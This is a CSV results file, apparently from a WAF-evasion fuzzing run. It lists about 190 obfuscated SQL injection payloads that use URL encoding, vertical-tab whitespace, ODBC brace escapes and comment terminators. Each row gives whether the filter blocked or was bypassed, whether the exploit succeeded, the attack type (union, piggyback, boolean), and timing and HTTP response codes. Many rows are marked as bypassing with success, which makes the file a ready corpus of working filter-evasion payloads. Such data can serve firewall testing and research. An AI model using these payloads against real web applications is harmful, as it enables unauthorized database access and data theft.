Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code
0%27<@=.1+||%0bnot+1=%0b(!+{x%0b(select%0b1)}=1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0102,71.34,No,200
0%27<@=1+or+not%0b{x+(select+1)}=1=%0b(not%0b{x+(select%0b1)}=1)%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0252,71.59,No,200
0%27<@=1+or%0bnot%0b{x+(select%0b1)}=1=+(!+{x%0b(select%0b1)}=1)%23,Blocked,No,None,piggyAtk,0.0107,70.19,No,403
0'<@=1.+||+{x%0b(select+1)}=1+like%0b{x%0b(select+1)}=1%0bor%27,Blocked,No,None,Unknown,0.015,70.19,No,403
0%27<@!=1%0bor%0b!%0b{x%0b(select+1)}=1=%0b(!+{x+(select+1)}=1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0197,70.19,No,200
0%27<@=.1%0bor+!+{a+1}=1=%0b(not+{`if`%0b1}=1)%0bor',Bypassed,No,None,Unknown,0.0147,70.19,No,500
0%27<@!=.1+||+!+{x%0b(select+1)}=1=%0b(!+1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0224,70.19,No,200
0'<@=.1+or+not+{x+(select%0b1)}=1=%0b(not+{`if`%0b1}=1)+or',Blocked,No,None,Unknown,0.0161,70.19,No,403
0'or+!@<@.+or+{a+1}=1+like%0b1+||',Bypassed,No,None,Unknown,0.0096,70.19,No,500
0%27<@=.1%0bor%0b!%0b{x%0b(select%0b1)}=1=+(not+{x%0b(select%0b1)}=1)%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0349,70.19,No,200
0'<@!=.1%0bor%0bnot+{`if`%0b1}=1=+(!%7e0)+or%27,Bypassed,No,None,Unknown,0.0229,70.19,No,500
0%27<@=.1%0bor+not+{a%0b1}=1=%0b(!+{x%0b(select+1)}=1)+||',Bypassed,No,None,Unknown,0.0216,70.19,No,500
0%27<@!=1%0bor%0b!%0b{x%0b(select%0b1)}=1=+(!+{x%0b(select%0b1)}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0199,70.19,No,200
0'<@=1.%0bor+not+{`if`+1}=1=%0b(!%0b{x%0b(select+1)}=1)%0b||%27,Bypassed,No,None,Unknown,0.0196,70.31,No,500
0%27<@!=1.%0b||+false=+(not~false)+||',Bypassed,No,None,Unknown,0.0204,70.43,No,500
0'<@=1%0b||+not%7efalse=%0b(!+true)--+,Bypassed,No,None,piggyAtk,0.0172,70.63,No,500
0'<@!=.1+or%0bnot+{x%0b(select%0b1)}=1=+(!+{x%0b(select%0b1)}=1)+||',Bypassed,No,None,Unknown,0.0122,70.84,No,500
0'<@=.1%0bor%0bnot+{`if`%0b1}=1=%0b(not+{`if`%0b1}=1)+or%27,Bypassed,No,None,Unknown,0.0291,70.84,No,500
0'<@!=1+or+not+{x+(select%0b1)}=1=%0b(not+{a%0b1}=1)%23,Blocked,No,None,piggyAtk,0.0162,70.84,No,403
0%27<@!=1+or+!~false=+(!%7efalse)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0127,71.09,No,200
0%27<@!=1+||%0bnot+true=+(!+{`if`%0b1}=1)+or',Bypassed,No,None,booleanAtk,0.0174,71.09,No,500
0%27<@=1.%0bor%0b!+{x+(select+1)}=1=+(!+{a%0b1}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0171,71.09,No,200
0%27or%0b1<@.+or%0b!%0b{x+(select%0b1)}=1=%0b(!%0b{`if`%0b1}=1)%0b||',Bypassed,No,None,Unknown,0.0242,71.21,No,500
0%27<@!=1.+or+not%0b{a+1}=1=%0b(false)%0b||',Bypassed,No,None,booleanAtk,0.019,71.33,No,500
0'<@!=1.%0bor%0bnot%0b{x%0b(select+1)}=1=+(not%0b{`if`%0b1}=1)%0bor',Bypassed,No,None,Unknown,0.0198,71.33,No,500
0'<@=.1+||+!%0b{`if`+1}=1=+(!+{x%0b(select%0b1)}=1)%0b||%27,Bypassed,No,None,Unknown,0.0211,71.33,No,500
0'<@=1%0b||%0bnot+{x+(select+1)}=1=+(!+{`if`+1}=1)--+,Bypassed,No,None,piggyAtk,0.0183,71.33,No,500
0'or+1<@+||+{`if`%0b1}=1%0blike%0b{x+(select+1)}=1%0bor%27,Bypassed,No,None,Unknown,0.0153,71.33,No,500
0'<@!=.1+or+not+1=%0b(!%0b{x+(select%0b1)}=1)%0bor%27,Bypassed,No,None,Unknown,0.0263,71.33,No,500
0'<@!=.1%0b||+not+{`if`+1}=1=+(!~false)+||',Bypassed,No,None,Unknown,0.0169,71.33,No,500
0'<@!=1+||%0b!+{x+(select+1)}=1=%0b(!%0b{`if`+1}=1)%0b||',Blocked,No,None,Unknown,0.0125,71.33,No,403
0'<@=1.%0bor%0b!%0b{x+(select+1)}=1=+(!%0b{a+1}=1)%0b||',Bypassed,No,None,Unknown,0.0357,71.33,No,500
0%27<@!=.1+||+{`if`+1}=1+like%0btrue+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0229,71.33,No,200
0%27<@!=1+or+!+{a%0b1}=1=%0b(!+{`if`%0b1}=1)%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0203,71.33,No,200
0%27<@!=.1+or+!%0b1=+(not+{`if`+1}=1)%0bor',Bypassed,No,None,Unknown,0.0219,71.33,No,500
0'||+1<@.+or+not%0b{x+(select+1)}=1=+(!+{x%0b(select%0b1)}=1)+or,Bypassed,No,None,Unknown,0.0156,71.33,No,500
0%27<@!=1+||%0bnot%7e0=%0b(not+{a+1}=1)%0bor',Bypassed,No,None,Unknown,0.0158,71.33,No,500
0'<@=.1%0bor+{x%0b(select%0b1)}=1+like%0b{x+(select+1)}=1--+,Bypassed,No,None,piggyAtk,0.0174,71.33,No,500
0%27<@!=1+or+not+{a%0b1}=1=%0b(not~false)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0251,71.33,No,200
0'<@=1+or%0bnot%0b1=+(not%0b{`if`%0b1}=1)+or%27,Bypassed,No,None,Unknown,0.0166,71.34,No,500
0'<@!=1.%0b||+not+{`if`+1}=1=+(not+1)+or%27,Bypassed,No,None,Unknown,0.0075,71.34,No,500
0'<@=1.+||+!+{x+(select+1)}=1=%0b(false)%0b||',Blocked,No,None,Unknown,0.0113,71.34,No,403
0'<@!=1.%0b||%0b{x+(select+1)}=1+like%0b{x+(select%0b1)}=1%0b||',Bypassed,No,None,Unknown,0.0116,71.34,No,500
0%27<@!=1.+or+not+{`if`%0b1}=1=%0b(!%0b{x%0b(select+1)}=1)%0bor',Bypassed,No,None,Unknown,0.0145,71.34,No,500
0%27<@!=1.%0bor%0btrue%0blike%0b{x+(select+1)}=1+||%27,Bypassed,Yes,unionAtk,booleanAtk,0.01,71.34,No,200
0'<@!=1.%0b||%0bfalse=+(not+{a%0b1}=1)+||',Bypassed,No,None,Unknown,0.0212,71.34,No,500
0'<@!=.1+||%0b!+true=%0b(not%0b{a+1}=1)+or%27,Bypassed,No,None,booleanAtk,0.0248,71.34,No,500
0%27<@!=1.+or+!%0b1+is%0bfalse%0bor',Bypassed,No,None,booleanAtk,0.0206,71.34,No,500
0%27<@!=1.%0bor+!+1=+(not+true)%0b||',Bypassed,No,None,booleanAtk,0.019,71.34,No,500
0'<@=1%0b||%0b!%0b{x%0b(select+1)}=1=+(not+{x%0b(select+1)}=1)--+,Bypassed,No,None,piggyAtk,0.0174,71.34,No,500
0%27<@=.1%0b||+not%0b{`if`+1}=1=%0b(!+{x+(select+1)}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.015,71.46,No,200
0%27<@!=1.+||%0bfalse=+(0)+||',Bypassed,No,None,Unknown,0.0142,71.59,No,500
0'<@=1%0bor%0b!+{a%0b1}=1=+(not+{a+1}=1)%23,Bypassed,No,None,piggyAtk,0.0066,71.34,No,500
0%27<@=1+or+not%0b{a%0b1}=1=%0b(not+{x%0b(select%0b1)}=1)+or',Bypassed,No,None,Unknown,0.0139,71.34,No,500
0'<@!=1%0bor%0bnot+{x%0b(select+1)}=1=%0b(!+{x+(select+1)}=1)+or',Bypassed,No,None,Unknown,0.014,71.34,No,500
0'<@!=.1+or+!+{a+1}=1=%0b(!%0b{x+(select%0b1)}=1)%23,Bypassed,No,None,piggyAtk,0.0239,71.34,No,500
0%27<@!=1%0bor+!+1=%0b(!+{a%0b1}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0177,71.34,No,200
0%27<@!=1.+or+false=%0b(not+{x+(select+1)}=1)%0b||%27,Bypassed,Yes,unionAtk,booleanAtk,0.0186,71.34,No,200
0'<@!=.1%0bor%0b!~0=%0b(false)%0b||%27,Bypassed,No,None,booleanAtk,0.0144,71.34,No,500
0%27||+!@<@.%0b||+{x%0b(select%0b1)}=1%0blike%0b{x+(select%0b1)}=1%0b||',Bypassed,No,None,Unknown,0.0143,71.34,No,500
0'<@!=.1%0bor+!~false=+(!%0b{`if`%0b1}=1)+||%27,Bypassed,No,None,booleanAtk,0.0134,71.59,No,500
0%27<@=1%0b||+not+{x+(select+1)}=1=%0b(not%0b{x+(select%0b1)}=1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0223,71.59,No,200
0'<@!=1+||+not+true=%0b(0)+or',Bypassed,No,None,booleanAtk,0.0103,71.59,No,500
0%27<@!=.1+||+!%7e0=+(!%0b{`if`%0b1}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0186,71.59,No,200
0%27<@=.1+or%0bnot%0b{x+(select%0b1)}=1=+(!+{x+(select%0b1)}=1)+or',Blocked,No,None,Unknown,0.0143,71.59,No,403
0'<@=1+||%0bnot+{a+1}=1=+(!%0b{x%0b(select+1)}=1)%0bor',Bypassed,No,None,Unknown,0.0131,71.59,No,500
0'<@!=1%0bor%0b!%0b{a%0b1}=1=+(not%0b{x+(select+1)}=1)%0bor',Bypassed,No,None,Unknown,0.0244,71.59,No,500
0'<@!=.1+||%0bnot~false=%0b(not+{a+1}=1)+||%27,Bypassed,No,None,Unknown,0.0198,71.59,No,500
0%27or+1<@+or+not+true=%0b(!+{x%0b(select%0b1)}=1)+||%27,Blocked,No,None,booleanAtk,0.0128,71.59,No,403
0'<@!=1.+or+not%0btrue=%0b(not%0b{a%0b1}=1)--+,Bypassed,No,None,piggyAtk,0.0219,71.59,No,500
0%27<@=1.%0bor%0b{x%0b(select+1)}=1+like%0b{x+(select%0b1)}=1%0b||',Bypassed,No,None,Unknown,0.0169,71.59,No,500
0%27<@=1+or+not+{x%0b(select+1)}=1=+(!+{x+(select%0b1)}=1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0171,71.59,No,200
0'<@=1%0b||+!+{x+(select%0b1)}=1=+(not%0b{`if`+1}=1)%23,Bypassed,No,None,piggyAtk,0.0185,71.72,No,500
0'<@=1.%0bor+not+{x+(select%0b1)}=1=+(!%0b{x+(select%0b1)}=1)%0b||%27,Bypassed,No,None,Unknown,0.0117,71.84,No,500
0'<@!=1+or+!%7e0=+(not+{x%0b(select+1)}=1)+or%27,Bypassed,No,None,Unknown,0.0237,71.84,No,500
0%27<@=1%0bor%0bnot+true=%0b(!+{`if`+1}=1)%0b||%27,Bypassed,Yes,unionAtk,booleanAtk,0.0257,71.84,No,200
0'<@!=1.+||+not%0b{a+1}=1=%0b(!%0b{x+(select+1)}=1)+or%27,Bypassed,No,None,Unknown,0.0157,71.84,No,500
0%27<@=.1+or%0b!%0b{`if`%0b1}=1=+(!+{x+(select%0b1)}=1)+||',Bypassed,No,None,Unknown,0.0091,71.84,No,500
0'<@!=1%0bor%0b!%0b{a%0b1}=1=+(!%0b{x%0b(select+1)}=1)+||%27,Bypassed,No,None,Unknown,0.0135,71.84,No,500
0%27<@!=.1+||+not+{x%0b(select+1)}=1=%0b(not+{x%0b(select+1)}=1)+or',Bypassed,No,None,Unknown,0.0207,71.84,No,500
0'or+!@<@.+||%0b{x+(select+1)}=1+like+{`if`+1}=1%0b||',Blocked,No,None,Unknown,0.0279,71.84,No,403
0'<@!=.1%0b||%0bnot%0b{x%0b(select%0b1)}=1=%0b(not%0b{x%0b(select%0b1)}=1)%0bor%27,Bypassed,No,None,Unknown,0.018,71.84,No,500
0'<@=1+or+!+{a+1}=1=+(not+1)%0b||%27,Blocked,No,None,Unknown,0.0195,71.84,No,403
0'<@=1.%0bor+0=%0b(not%0b{x%0b(select+1)}=1)%0b||',Bypassed,No,None,Unknown,0.018,71.84,No,500
0%27<@!=.1+||%0b!%0b{a%0b1}=1=+(!+{x+(select+1)}=1)%23,Blocked,No,None,piggyAtk,0.0061,71.84,No,403
0'<@!=.1%0b||%0b{`if`+1}=1%0blike%0b1--%0b,Bypassed,No,None,piggyAtk,0.0151,71.84,No,500
0'<@=.1+||%0b!+{`if`+1}=1=%0b(not+{x+(select+1)}=1)%0b||%27,Bypassed,No,None,Unknown,0.0136,71.84,No,500
0'<@!=.1+or%0bnot~0=%0b(0)+||',Bypassed,No,None,Unknown,0.0156,71.84,No,500
0'<@=1.+or+!%0btrue=+(!%0b{a+1}=1)%23,Bypassed,No,None,piggyAtk,0.0347,71.84,No,500
0%27<@=1.%0b||+not+{x%0b(select%0b1)}=1=+(!%0b{x%0b(select+1)}=1)%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0216,71.84,No,200
0%27<@=1.+or+not%0b{a+1}=1=+(not%0b1)+or',Bypassed,No,None,Unknown,0.0101,71.84,No,500
0'<@=1.+||+!+true=%0b(!%0b{`if`+1}=1)+||',Bypassed,No,None,Unknown,0.0145,71.84,No,500
0%27<@!=1.%0b||+!+{x%0b(select+1)}=1=%0b(!%0b{a+1}=1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0123,71.84,No,200
0%27or%0b!@<@%0bor+{`if`+1}=1%0blike%0b1%0bor',Bypassed,No,None,Unknown,0.01,71.84,No,500
0'<@!=1.+or+not%0b{x+(select+1)}=1=+(not%0btrue)%0bor%27,Bypassed,No,None,booleanAtk,0.0114,71.84,No,500
0%27<@!=.1%0bor+!%0b{x%0b(select+1)}=1=+(not+{x+(select%0b1)}=1)+or',Bypassed,No,None,Unknown,0.0108,71.84,No,500
0%27<@!=1.+or%0b!%0b{a+1}=1=%0b(false)%0b||%27,Bypassed,Yes,unionAtk,booleanAtk,0.0174,71.84,No,200
0%27<@!=1+||%0bnot+{x+(select+1)}=1=%0b(!+{x+(select%0b1)}=1)+or',Blocked,No,None,Unknown,0.0084,71.97,No,403
0%27<@=.1+||+not+{`if`+1}=1=+(0)%23,Bypassed,Yes,unionAtk,piggyAtk,0.018,72.1,No,200
0%27<@=1.+||+not+{x%0b(select+1)}=1=%0b(not+true)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0122,72.1,No,200
0'<@!=1%0b||+not+true=+(not%0b{x+(select+1)}=1)+or%27,Bypassed,No,None,booleanAtk,0.0237,72.1,No,500
0'||+@<@.+||+1+like%0b{a%0b1}=1+or',Bypassed,No,None,Unknown,0.0166,72.1,No,500
0%27<@!=.1+or%0b0=+(!+{x+(select%0b1)}=1)%0b||%27,Blocked,No,None,Unknown,0.0292,71.34,No,403
0%27<@!=1+or+!+{x+(select%0b1)}=1=+(not%0b{`if`%0b1}=1)%0b||',Blocked,No,None,Unknown,0.0163,71.34,No,403
0'or%0b1<@.+||%0b{a%0b1}=1+like%0b{x+(select+1)}=1+||%27,Bypassed,No,None,Unknown,0.0206,71.34,No,500
0%27<@!=.1+or+not+{x+(select+1)}=1=+(not+{a+1}=1)+||',Blocked,No,None,Unknown,0.0116,71.34,No,403
0'<@!=.1%0bor%0b!%0b{a+1}=1=+(!%0b{x+(select%0b1)}=1)+||%27,Bypassed,No,None,Unknown,0.0231,71.34,No,500
0%27<@=.1+or%0b{x+(select+1)}=1%0blike%0b{x%0b(select%0b1)}=1+||',Bypassed,No,None,Unknown,0.0159,71.34,No,500
0'<@!=.1%0bor%0bnot+{x+(select+1)}=1=%0b(0)%23,Bypassed,No,None,piggyAtk,0.0278,71.46,No,500
0'or+@<@.+or+not+{`if`+1}=1=%0b(not%0b{x+(select%0b1)}=1)%0bor%27,Bypassed,No,None,Unknown,0.0218,71.59,No,500
0%27<@=1.%0bor%0b{x%0b(select%0b1)}=1+like+{x+(select+1)}=1%0b||',Bypassed,No,None,Unknown,0.0248,71.59,No,500
0'<@=1.+or%0b!+{x%0b(select%0b1)}=1=%0b(not+{x+(select+1)}=1)+||%27,Bypassed,No,None,Unknown,0.0149,71.59,No,500
0'<@=1.%0b||+not+{x+(select%0b1)}=1=+(not+{a+1}=1)%0b||%27,Bypassed,No,None,Unknown,0.0223,71.59,No,500
0%27<@!=.1%0bor+not~false=+(!+{`if`+1}=1)%0b||%27,Bypassed,Yes,unionAtk,booleanAtk,0.0158,71.59,No,200
0'<@=1.%0b||%0b!+1=+(not%0b{x+(select+1)}=1)+||%27,Bypassed,No,None,Unknown,0.0149,71.59,No,500
0'<@=1.+or+{a+1}=1%0blike+{a+1}=1+||',Bypassed,No,None,Unknown,0.0136,71.59,No,500
0%27<@=1+or+not+{x+(select+1)}=1=+(!+{x%0b(select%0b1)}=1)%0b||',Blocked,No,None,Unknown,0.0156,71.59,No,403
0%27<@!=1.+or+!+{x+(select%0b1)}=1=%0b(not%0b{`if`+1}=1)%0b||%27,Blocked,No,None,Unknown,0.0182,71.59,No,403
0%27<@=.1%0bor+!%0b{x+(select+1)}=1=+(not+{`if`%0b1}=1)+||',Bypassed,No,None,Unknown,0.0112,71.59,No,500
0%27<@=.1+or%0bnot+1=%0b(0)%0bor',Bypassed,No,None,Unknown,0.0234,71.59,No,500
0'<@!=.1%0b||%0bnot%0b{x+(select%0b1)}=1=%0b(not%0b{x+(select+1)}=1)--%0b,Bypassed,No,None,piggyAtk,0.0159,71.72,No,500
0'<@=1.%0bor%0bfalse+is%0bfalse+||',Bypassed,No,None,booleanAtk,0.0134,71.84,No,500
0%27or+@<@.+or%0bnot%0b{`if`+1}=1=%0b(not+1)+||',Bypassed,No,None,Unknown,0.0201,71.84,No,500
0%27<@!=1.+or%0bnot%0b{a%0b1}=1=%0b(!+{`if`%0b1}=1)+or',Bypassed,No,None,Unknown,0.0196,71.84,No,500
0'<@!=1.%0b||+!+{x+(select+1)}=1=%0b(not+1)+or',Bypassed,No,None,Unknown,0.0133,71.84,No,500
0'<@=1+or%0bnot%0b{x%0b(select%0b1)}=1=%0b(not%0b{x%0b(select+1)}=1)%0bor',Blocked,No,None,Unknown,0.0141,71.84,No,403
0%27<@=1.%0bor%0b!%0b1=%0b(!%0btrue)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0193,71.84,No,200
0%27<@!=.1+||%0bnot+{x%0b(select%0b1)}=1=%0b(not+{x%0b(select%0b1)}=1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0094,71.84,No,200
0%27<@=1.%0bor%0b!%0b{x%0b(select+1)}=1=+(not~false)%0bor%27,Bypassed,Yes,unionAtk,booleanAtk,0.0132,71.84,No,200
0'<@=1.+||+not+{a+1}=1=+(not%0b{`if`%0b1}=1)--%0b,Bypassed,No,None,piggyAtk,0.024,71.84,No,500
0%27<@=1+or+not~false=+(!~0)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0218,71.84,No,200
0'<@!=1.%0b||%0bnot+{a%0b1}=1=+(!%0b{a%0b1}=1)+or%27,Bypassed,No,None,Unknown,0.0205,71.84,No,500
0%27<@!=1+or%0bnot%0b{x+(select+1)}=1=%0b(not%7e0)%0bor%27,Blocked,No,None,Unknown,0.0102,71.84,No,403
0%27<@!=1.%0bor%0btrue%0blike+{`if`+1}=1+||',Bypassed,No,None,booleanAtk,0.0196,71.84,No,500
0%27<@=1.+||%0b!%0b{x%0b(select%0b1)}=1=+(!+true)%0bor%27,Bypassed,Yes,unionAtk,booleanAtk,0.0112,71.84,No,200
0%27<@=.1+or%0b!~0=+(!+{x+(select+1)}=1)+||%27,Blocked,No,None,Unknown,0.015,71.84,No,403
0'<@=1+||+!+{x%0b(select%0b1)}=1=+(0)+or',Bypassed,No,None,Unknown,0.0112,71.84,No,500
0%27<@=.1+or%0b!~false=%0b(!%0b{x+(select%0b1)}=1)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0183,71.84,No,200
0%27<@!=1+||%0bnot+{x+(select+1)}=1=+(!+true)+||%27,Blocked,No,None,Unknown,0.0238,71.84,No,403
0'<@!=1.+or%0bnot+{a+1}=1=%0b(!~false)+||',Bypassed,No,None,booleanAtk,0.0146,71.84,No,500
0'<@=1%0b||+!%0b{`if`+1}=1=+(!+{`if`+1}=1)+or%27,Bypassed,No,None,Unknown,0.0213,71.84,No,500
0'<@=1%0b||+!+{x%0b(select+1)}=1=%0b(!+{x+(select+1)}=1)+||%27,Bypassed,No,None,Unknown,0.0088,71.84,No,500
0'<@=1.+or%0b!%0b{`if`%0b1}=1=%0b(not+{x%0b(select+1)}=1)--+,Bypassed,No,None,piggyAtk,0.0194,71.84,No,500
0%27<@!=.1+or+!%0b{a+1}=1=%0b(not%7e0)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0111,71.84,No,200
0'or+@<@.+||+not+{`if`%0b1}=1=+(!%7efalse)+or%27,Bypassed,No,None,booleanAtk,0.011,71.84,No,500
0'<@!=1%0b||%0bnot%0b{x+(select+1)}=1=%0b(!+{x+(select+1)}=1)+or%27,Bypassed,No,None,Unknown,0.0192,71.84,No,500
0'<@!=1+||+!%0b1=+(!%0b{x%0b(select%0b1)}=1)+||',Bypassed,No,None,Unknown,0.0136,71.84,No,500
0'<@=1.+or%0bnot+{x%0b(select%0b1)}=1=+(not%0b{x+(select%0b1)}=1)+or',Bypassed,No,None,Unknown,0.0094,71.97,No,500
0%27<@=1%0b||%0bnot~false=+(!+{x%0b(select%0b1)}=1)%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.014,72.1,No,200
0%27<@=.1%0b||%0b!+{x%0b(select+1)}=1=%0b(not+{x%0b(select%0b1)}=1)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0164,72.1,No,200
0%27<@!=.1+||+not+{x%0b(select%0b1)}=1=%0b(not%0b{x+(select%0b1)}=1)%0bor',Bypassed,No,None,Unknown,0.0134,72.1,No,500
0%27||+1<@.%0bor%0bnot%0b{x+(select+1)}=1=+(not+{`if`%0b1}=1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0142,72.1,No,200
0'<@!=1+or%0b!%0b{`if`%0b1}=1=+(not%0b{`if`+1}=1)+||',Bypassed,No,None,Unknown,0.0162,71.34,No,500
0'<@!=1.%0bor%0b!%0b{x%0b(select+1)}=1=+(not%0b{x+(select%0b1)}=1)%0bor',Bypassed,No,None,Unknown,0.0167,71.34,No,500
0%27<@!=1+||%0b{x%0b(select%0b1)}=1%0blike%0b{`if`%0b1}=1%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0289,71.34,No,200
0'<@!=1+||%0bnot+{`if`%0b1}=1=+(not+{a+1}=1)--+,Bypassed,No,None,piggyAtk,0.0251,71.34,No,500
0'<@!=1.+or+not+{x+(select+1)}=1=%0b(not+{`if`+1}=1)%0bor%27,Blocked,No,None,Unknown,0.0092,71.34,No,403
0'<@=1.+||+not+{x+(select+1)}=1=+(!%0b{`if`+1}=1)+or',Blocked,No,None,Unknown,0.0166,71.46,No,403
0%27<@!=.1+or%0b{x%0b(select+1)}=1+like+{`if`+1}=1+||%27,Bypassed,Yes,unionAtk,Unknown,0.0179,71.59,No,200
0%27<@!=.1+or%0bnot~false=+(not%0b{x%0b(select+1)}=1)+||%27,Bypassed,Yes,unionAtk,booleanAtk,0.0287,71.59,No,200
0%27<@=1.+or+not+{x%0b(select+1)}=1=+(not~false)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0192,71.59,No,200
0%27<@=.1+||%0b!+{`if`%0b1}=1=+(!%0b1)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0156,71.59,No,200
0'<@=1%0bor+!%0b{`if`+1}=1=%0b(!+{x+(select+1)}=1)%0b||%27,Bypassed,No,None,Unknown,0.0114,71.59,No,500
0%27<@!=.1%0bor%0b!+{x%0b(select+1)}=1=%0b(not+{x%0b(select%0b1)}=1)--+,Bypassed,Yes,unionAtk,piggyAtk,0.021,71.59,No,200
0%27<@!=1%0b||%0b!~0=+(not%7efalse)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0287,71.59,No,200
0%27<@!=.1%0b||%0bnot+{x%0b(select+1)}=1=+(!+1)%0b||',Bypassed,No,None,Unknown,0.0183,71.59,No,500
0%27<@!=.1+or+!+{x+(select+1)}=1=%0b(not%0b{`if`+1}=1)+or',Blocked,No,None,Unknown,0.0103,71.59,No,403
0%27<@=1%0b||%0b!+{x+(select+1)}=1=+(!+{`if`+1}=1)%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0343,71.59,No,200
0'<@!=1.+or+not+{a%0b1}=1=+(!%0b1)%0bor',Bypassed,No,None,Unknown,0.0179,71.72,No,500
0'<@!=.1%0b||+!+{a+1}=1=+(not+{x+(select+1)}=1)+or',Bypassed,No,None,Unknown,0.0166,71.84,No,500
0%27<@!=.1+||+!+{`if`+1}=1=+(not+{a%0b1}=1)+||',Bypassed,No,None,Unknown,0.0463,71.84,No,500
0%27<@=1%0b||%0bnot+true=+(!%0b{x+(select%0b1)}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0166,71.84,No,200
0'<@=1.%0b||%0b!~false=+(!+{`if`%0b1}=1)--+,Bypassed,No,None,piggyAtk,0.0246,71.84,No,500
0%27<@=.1+or+!%0b{`if`+1}=1=%0b(!+{a+1}=1)+or',Bypassed,No,None,Unknown,0.0131,71.84,No,500
0%27<@=1+||+!%0b{`if`+1}=1=+(not+{`if`%0b1}=1)+||',Bypassed,No,None,Unknown,0.014,71.84,No,500
0'<@!=1%0bor%0b{a+1}=1%0blike%0b{a+1}=1%0b||%27,Bypassed,No,None,Unknown,0.0166,71.84,No,500
0'<@=1+||+!%0b{x+(select+1)}=1=%0b(!+{a+1}=1)+or%27,Bypassed,No,None,Unknown,0.0197,71.84,No,500
0%27<@=1.+||+!+{a%0b1}=1=%0b(!+{a%0b1}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0141,71.84,No,200
0'<@!=1.%0bor+!%0b{`if`+1}=1=+(not+{x%0b(select%0b1)}=1)+or%27,Bypassed,No,None,Unknown,0.0206,71.84,No,500
0'<@!=1.%0b||+{`if`+1}=1+like+{`if`%0b1}=1+||',Bypassed,No,None,Unknown,0.0214,71.84,No,500
0'<@=.1+||%0b!+{`if`%0b1}=1=+(!%0b{x%0b(select+1)}=1)+or',Bypassed,No,None,Unknown,0.0143,71.84,No,500
0%27<@!=.1+or%0bnot+{x+(select+1)}=1=+(!+1)+or%27,Blocked,No,None,Unknown,0.0129,71.84,No,403
0%27<@=1%0bor%0bnot+{a+1}=1=%0b(not%0btrue)+||%27,Bypassed,Yes,unionAtk,booleanAtk,0.0123,71.84,No,200
0'<@!=.1+||+!+{x%0b(select+1)}=1=+(not+{x+(select%0b1)}=1)%0b||',Bypassed,No,None,Unknown,0.0195,71.84,No,500
0%27<@!=1.+||%0b{a+1}=1+like+{x%0b(select+1)}=1%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.014,71.84,No,200
0'<@!=1.%0bor+0=+(not+{x%0b(select+1)}=1)+||',Bypassed,No,None,Unknown,0.0204,71.84,No,500
0'<@!=1.+||+!%0b{x+(select%0b1)}=1=%0b(0)+or%27,Bypassed,No,None,Unknown,0.0136,71.84,No,500
0'<@!=1.%0bor+not%0b1=+(!+{x%0b(select%0b1)}=1)--%0b,Bypassed,No,None,piggyAtk,0.0222,71.84,No,500
